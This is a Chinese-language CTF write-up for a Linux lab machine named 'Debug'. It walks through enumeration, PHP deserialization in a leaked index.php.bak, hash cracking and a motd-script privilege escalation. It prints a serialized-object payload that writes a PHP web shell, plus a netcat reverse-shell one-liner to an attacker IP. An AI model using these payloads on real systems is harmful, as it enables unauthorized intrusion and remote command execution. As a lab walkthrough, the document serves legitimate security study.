# Debug

Linux机器CTF！您将了解枚举，查找隐藏的密码文件以及如何利用php反序列化！

---

## 端口扫描

循例，nmap

![在这里插入图片描述](https://img-blog.csdnimg.cn/cf0598e525d843498303ea8305bc4234.png)

## Web枚举

进到web是apache默认页面，直接开扫

![在这里插入图片描述](https://img-blog.csdnimg.cn/8c1096a898224893a93243f14e33104d.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/69a99f5b734547f3ae42601838557d4c.png)

由于题目告诉我们涉及php反序列化，那直接找php文件来看，这里下载index.php.bak

## PHP 反序列化

非常简单的反序列化

”所有php里面的值都可以使用函数 serialize () 来返回一个包含字节流的字符串来表示。. unserialize () 函数能够重新把字符串变回php原来的值。. 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。. 为了能够 unserialize () 一个对象，这个对象的类必须已经定义过。. 如果序列化类A的一个对象，将会返回一个跟类A相关，而且包含了对象所有变量值的字符串。. 如果要想在另外一个文件中反序列化一个对象，这个对象的类必须在反序列化之前定义“

```php
<?php

class FormSubmit {

public $form_file = 'message.txt';
public $message = '';

public function SaveMessage() {

$NameArea = $_GET['name']; 
$EmailArea = $_GET['email'];
$TextArea = $_GET['comments'];

	$this-> message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";

}

public function __destruct() {

file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
echo 'Your submission has been successfully saved!';

}

}

// Leaving this for now... only for debug purposes... do not touch!

$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);

$application = new FormSubmit;
$application -> SaveMessage();


?>
```

这里对debug参数进行反序列并执行函数

```php
$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);

$application = new FormSubmit;
$application -> SaveMessage();
```

这里直接劫持form_file和message参数，然后重新序列化

```php
public $form_file = 'cmd.php';
public $message = '<?php @system($_GET["cmd"]);?>';
```

```php
$obj = new FormSubmit();

echo serialize($obj);
```

传过去：

![在这里插入图片描述](https://img-blog.csdnimg.cn/223c1998bb004e54bd4dd7f695dd9ac6.png)

开启nc监听，然后直接reverse shell

payload:

	mkfifo /tmp/f1;nc 10.14.39.48 8888 < /tmp/f1 | /bin/bash > /tmp/f1

![在这里插入图片描述](https://img-blog.csdnimg.cn/b4edef25681243cbb671c8e12132d589.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/a236a608ec34411e9ebe4bbb0895b0e0.png)

加固shell:

	python3 -c "import pty;pty.spawn('/bin/bash')"


## 横向移动

在home目录下有两个文件夹，但是无权访问

![在这里插入图片描述](https://img-blog.csdnimg.cn/6c95d1378e944888b3806870410f7081.png)

再看看服务账户的家目录下，看一下.htpasswd发现了james的凭据

![在这里插入图片描述](https://img-blog.csdnimg.cn/7d20d16278ee49a197f6e7ba3f4369a4.png)

这里可以使用hash-identifier查看类型然后再查看hashcat -h找找类型值

为了方便我这里使用haiti-hash，这个工具直接给出hashcat和john的对应类型值

![在这里插入图片描述](https://img-blog.csdnimg.cn/4601bd23f1804fa7888f242c2749d474.png)

hashcat爆破：

	hashcat -a 0 -m 1600 ./hash /usr/share/wordlists/rockyou.txt

![在这里插入图片描述](https://img-blog.csdnimg.cn/e9f5f990897e4fd599ecce2e2020b342.png)

直接登录james的ssh

![在这里插入图片描述](https://img-blog.csdnimg.cn/b824ad7cd5a94f46bbb9afd9b2872314.png)

## 权限提升

查看.bash_history

![在这里插入图片描述](https://img-blog.csdnimg.cn/d9a9d94a3daa48fe99b9c3b4c1dc073c.png)

发现该目录下的文件james组有权修改，这里可以执行命令

![在这里插入图片描述](https://img-blog.csdnimg.cn/7584cd192177462a85c2932fdfaa74ae.png)

修改00-header

![在这里插入图片描述](https://img-blog.csdnimg.cn/84a02a1e4db9441987764f0e09110ac2.png)

重新登录james的ssh

![在这里插入图片描述](https://img-blog.csdnimg.cn/7380c40a6f47434aa33f80e17a54b1be.png)

getroot
